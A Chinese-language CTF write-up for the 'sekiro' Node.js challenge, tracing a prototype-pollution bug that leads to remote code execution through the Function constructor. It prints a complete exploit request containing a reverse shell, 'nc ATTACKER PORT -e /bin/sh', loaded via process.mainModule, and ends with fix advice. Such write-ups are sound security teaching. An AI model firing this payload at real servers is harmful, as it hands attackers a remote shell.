# sekiro

## 题目简述

服务端会把玩家提交的 JSON 递归合并到状态对象中。合并函数没有过滤 `__proto__`，因此可以污染 `Object.prototype`。后续战斗逻辑把 `attackInfo.additionalEffect` 拼进 `Function` 构造器；当随机攻击项本身没有这个属性时，它会从原型链继承被污染的字符串并执行，最终形成原型链污染到命令执行的完整利用链。

## 解题过程

审计 `web/routes/index.js` 中的递归合并逻辑，可以看到它把用户可控键逐层写入目标对象，却没有拒绝 `__proto__`、`prototype` 或 `constructor`。提交如下结构后，`additionalEffect` 会落到所有普通对象共享的原型上：

```json
{
  "solution": "1",
  "__proto__": {
    "additionalEffect": "PAYLOAD"
  }
}
```

命令执行点位于 `utils/index.js`：

```javascript
if (sekiro.attackInfo.additionalEffect) {
  var fn = Function(
    "sekiro",
    sekiro.attackInfo.additionalEffect + "\nreturn sekiro"
  );
  sekiro = fn(sekiro);
}
```

`attackInfo` 是随机选择的攻击项。部分项目定义了自己的 `additionalEffect`，部分没有；后者访问该属性时会沿原型链读取污染值。于是只要重复触发战斗，最终就会把攻击者字符串交给 `Function` 编译执行。

这里不能直接使用常见的 `require('child_process')` 写法。`Function` 创建的代码在全局作用域执行，而 Node.js 模块包装器中的局部变量 `require` 不在该作用域。可以从全局 `process` 找到主模块的构造器，再调用内部加载函数：

```javascript
global.process.mainModule.constructor
  ._load('child_process')
  .exec('nc ATTACKER PORT -e /bin/sh', function () {});
```

最终请求为：

```json
{
  "solution": "1",
  "__proto__": {
    "additionalEffect": "global.process.mainModule.constructor._load('child_process').exec('nc ATTACKER PORT -e /bin/sh',function(){});"
  }
}
```

监听对应端口并多次提交请求，等随机选中没有自有 `additionalEffect` 的攻击项后即可收到 shell，再读取 flag。若目标环境的 `nc` 不支持 `-e`，应把末尾命令替换为目标可用的 Bash、Python 或 FIFO 反弹方式；漏洞原理不变。

## 方法总结

- 决定性漏洞不是单独的原型链污染，而是污染值最终进入 `Function` 构造器，形成可执行的数据流。
- 利用具有概率性，是因为自有属性会遮蔽原型属性；只有缺少该属性的随机攻击项才会读取污染结果。
- 修复时应使用无原型字典或安全合并函数，拒绝原型相关键，并删除对动态字符串的 `Function`/`eval` 求值。
